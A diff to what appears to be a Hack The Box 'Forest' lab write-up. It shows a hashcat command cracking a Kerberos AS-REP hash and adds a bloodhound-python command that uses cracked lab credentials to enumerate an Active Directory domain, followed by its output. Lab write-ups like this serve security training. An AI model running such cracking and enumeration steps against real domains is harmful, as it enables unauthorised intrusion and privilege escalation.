@@ -180,10 +180,25 @@ hashcat -m 18200 svc.kerb /usr/share/wordlists/rockyou.txt --force
 # Privilage Escalation
 - run SharpHound to collect data for BloodHound upload it with
 ```
-upload SharpHound.ps1
-```
-- run it with
-```
-invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+─$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip 
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 32 users
+INFO: Found 76 groups
+INFO: Found 2 gpos
+INFO: Found 15 ous
+INFO: Found 20 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done in 00M 36S
+INFO: Compressing output into 20230806032419_bloodhound.zip
 ```
 
